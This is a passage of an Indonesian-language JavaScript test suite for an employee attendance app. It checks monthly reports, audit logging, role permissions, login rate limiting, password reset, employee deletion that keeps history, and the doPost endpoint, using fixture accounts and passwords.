  const rep = must(env.api('report.monthly', { month: '2026-10' }, relogin(env, 'rina')));
  const budi = rep.rows.find(r => r.employeeId === ids.budi);
  assert.equal(budi.hadir, 2);
  assert.equal(budi.terlambat, 0);
  assert.equal(budi.izin, 2, 'izin dihitung per hari kalender');
  assert.equal(budi.alpha, 0);
  assert.equal(budi.tidakCheckout, 1);
  assert.equal(budi.menitKerja, 120);
  const siti = rep.rows.find(r => r.employeeId === ids.siti);
  assert.equal(siti.alpha, 0, 'tidak absen ≠ alpha karena tidak ada jadwal');
});

test('X23 koreksi status oleh HR tercatat di audit log; waktu tidak berubah', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '08:40') });
  const r = must(attend(env, tokens.budi, 'checkin', INSIDE));
  must(env.api('attendance.update', { attendanceId: r.attendanceId, status: 'Dinas Luar', note: 'Kunjungan klien' }, tokens.rina));
  const row = env.table('Attendance')[0];
  assert.equal(row.status, 'Dinas Luar');
  assert.equal(row.checkInAt, new Date(wib(DAY, '08:40')).toISOString());
  const log = env.table('AuditLogs').find(l => l.action === 'ATTENDANCE_EDIT');
  assert.match(log.detail, /Hadir.*Dinas Luar/);
});

test('X24 dashboard & halaman web dapat dimuat', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  const d = must(env.api('dashboard.summary', {}, tokens.admin));
  assert.equal(d.team.totalKaryawan, 4);
  assert.equal(d.team.hadir, 1);
  assert.equal(d.team.chart.length, 7);
  const html = env.run('doGet');
  assert.ok(html.content.includes('<div id="app"'), 'Index.html ter-render');
  assert.ok(!html.content.includes('<?'), 'semua scriptlet terevaluasi');
});

/* ---------- Uji regresi dari tinjauan kode ---------- */

test('X25 HR tidak dapat menonaktifkan akun Admin lewat hapus karyawan', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const dir = must(env.api('employees.save', { nama: 'Dewi Direktur', departemen: 'Direksi', createAccount: true, username: 'dewi', accountRole: 'admin' }, tokens.admin));
  const res = env.api('employees.remove', { employeeId: dir.employeeId }, tokens.rina);
  assert.equal(res.code, 'FORBIDDEN');
  assert.equal(env.table('Users').find(u => u.username === 'dewi').status, 'Aktif');
});

test('X26 retensi hanya berjalan dari trigger proyek atau editor', () => {
  const { env } = bootstrap();
  env.state.activeEmail = '';
  assert.throws(() => env.run('runRetentionCleanup'), /pemilik.editor/);
  assert.throws(() => env.run('runRetentionCleanup', { triggerUid: '999999' }), /pemilik.editor/);
  const uid = env.state.triggers.find(x => x.fn === 'runRetentionCleanup').getUniqueId();
  assert.match(env.run('runRetentionCleanup', { triggerUid: uid }), /Foto dihapus/);
});

test('X27 username tidak valid/duplikat tidak meninggalkan data karyawan setengah jadi', () => {
  const { env, tokens } = bootstrap();
  const before = env.table('Employees').length;
  assert.equal(env.api('employees.save', { nama: 'Tono', createAccount: true, username: 'X Y!' }, tokens.admin).code, 'VALIDATION');
  assert.equal(env.api('employees.save', { nama: 'Tono', createAccount: true, username: 'budi' }, tokens.admin).code, 'VALIDATION');
  assert.equal(env.table('Employees').length, before);
});

test('X28 pembaruan baris tidak menimpa kolom tambahan buatan Admin', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.budi, 'checkin', INSIDE));
  const sh = env.sheet('Attendance');
  const col = sh.data[0].length + 1;
  sh.getRange(1, col).setValue('catatanAdmin');
  sh.getRange(2, col).setValue("'diverifikasi supervisor");
  env.setNow(wib(DAY, '17:05'));
  must(attend(env, tokens.budi, 'checkout', INSIDE));
  const row = env.table('Attendance')[0];
  assert.equal(row.catatanAdmin, 'diverifikasi supervisor');
  assert.ok(row.checkOutAt);
  assert.equal(row.checkInLocal, '2026-10-26 07:50:00', 'kolom lain tetap teks, tidak berubah menjadi Date');
});

test('X29 penanda wajah hanya dicatat bila pemeriksaan wajah diaktifkan Admin', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.budi, 'checkin', INSIDE, { faceCheck: 'not_detected' }));
  assert.doesNotMatch(env.table('Attendance')[0].flags, /FACE_NOT_DETECTED/);
  const cfg = must(env.api('settings.get', {}, tokens.admin)).config;
  must(env.api('settings.save', Object.assign({}, cfg, { faceCheck: 'advisory' }), tokens.admin));
  must(attend(env, tokens.siti, 'checkin', INSIDE, { faceCheck: 'not_detected' }));
  assert.match(env.table('Attendance')[1].flags, /IN:FACE_NOT_DETECTED/);
  assert.match(env.table('AuditLogs').filter(l => l.action === 'SETTINGS_UPDATE').pop().detail, /FACE_CHECK/);
});

test('X30 resetAdminPassword() mengembalikan password admin ke 12345678 & login berhasil', () => {
  const { env } = bootstrap();
  for (let i = 0; i < 5; i++) env.api('auth.login', { username: 'admin', password: 'salah' + i });
  assert.equal(env.api('auth.login', { username: 'admin', password: '12345678' }).code, 'RATE_LIMIT', 'terkunci sebelum reset');
  const msg = env.run('resetAdminPassword');
  assert.match(msg, /"admin": 12345678 \| verifikasi: OK \| status akun: Aktif/);
  const r = must(env.api('auth.login', { username: 'admin', password: '12345678' }), 'login setelah reset');
  assert.equal(r.user.mustChangePassword, true);
  assert.equal(env.api('dashboard.summary', {}, r.token).code, 'PASSWORD_CHANGE_REQUIRED');
});

test('X31 hapus karyawan yang berhenti: hilang dari daftar beserta akunnya, riwayat tetap jadi arsip, nomor tidak dipakai ulang', () => {
  const { env, tokens, ids } = bootstrap({ now: wib(DAY, '07:50') });
  must(attend(env, tokens.siti, 'checkin', INSIDE));
  const res = must(env.api('employees.remove', { employeeId: ids.siti }, tokens.rina));
  assert.equal(res.outcome, 'deleted');
  assert.match(res.message, /akun loginnya/);
  assert.equal(env.table('Employees').some(e => e.employeeId === ids.siti), false, 'hilang dari sheet Employees');
  assert.equal(env.table('Users').some(u => u.username === 'siti'), false, 'akun login ikut dihapus');
  assert.equal(env.api('auth.me', {}, tokens.siti).code, 'AUTH_REQUIRED', 'sesi yang masih terbuka langsung gugur');
  assert.equal(env.table('Attendance').filter(r => r.employeeId === ids.siti).length, 1, 'riwayat absensi tetap tersimpan');
  assert.equal(must(env.api('employees.list', {}, tokens.rina)).employees.some(e => e.employeeId === ids.siti), false);
  // Karyawan baru tidak mendapat nomor lama (riwayat Siti tidak boleh menempel).
  const max = Math.max(...env.table('Employees').map(e => Number(e.employeeId.slice(1))), Number(ids.siti.slice(1)));
  const r = must(env.api('employees.save', { nama: 'Karyawan Baru', jabatan: 'Host', departemen: 'HOST', tanggalBergabung: '2026-11-01' }, tokens.rina));
  assert.notEqual(r.employeeId, ids.siti);
  assert.equal(Number(r.employeeId.slice(1)), max + 1);
  // Hapus karyawan terakhir lalu tambah lagi: nomor tetap naik.
  must(env.api('employees.remove', { employeeId: r.employeeId }, tokens.rina));
  const r2 = must(env.api('employees.save', { nama: 'Karyawan Lain', jabatan: 'Host', departemen: 'HOST', tanggalBergabung: '2026-11-01' }, tokens.rina));
  assert.equal(Number(r2.employeeId.slice(1)), max + 2);
  assert.ok(env.table('AuditLogs').some(l => l.action === 'EMPLOYEE_REMOVE'));
  assert.equal(env.api('employees.remove', { employeeId: ids.budi }, tokens.budi).code, 'FORBIDDEN', 'karyawan biasa tidak bisa menghapus');
});

test('X32 doPost (dipakai versi Vercel) memberi hasil & pemeriksaan yang sama dengan api()', () => {
  const { env, tokens } = bootstrap({ now: wib(DAY, '07:50') });
  const post = body => JSON.parse(env.run('doPost', { postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } }).content);
  const me = post({ action: 'auth.me', payload: {}, token: tokens.budi });
  assert.equal(me.ok, true);
  assert.equal(me.data.user.username, 'budi');
  assert.equal(post({ action: 'auth.me', payload: {}, token: 'x'.repeat(64) }).code, 'AUTH_REQUIRED');
  assert.equal(post({ action: 'users.list', payload: {}, token: tokens.budi }).code, 'FORBIDDEN', 'role tetap diperiksa');
  assert.equal(post('bukan json').code, 'BAD_REQUEST');
  assert.equal(post({ action: 'setup' }).code, 'BAD_REQUEST', 'fungsi server lain tidak bisa dipanggil');
  const login = post({ action: 'auth.login', payload: { username: 'budi', password: 'Rahasiabudi2026' } });
  assert.ok(login.ok && login.data.token);
});
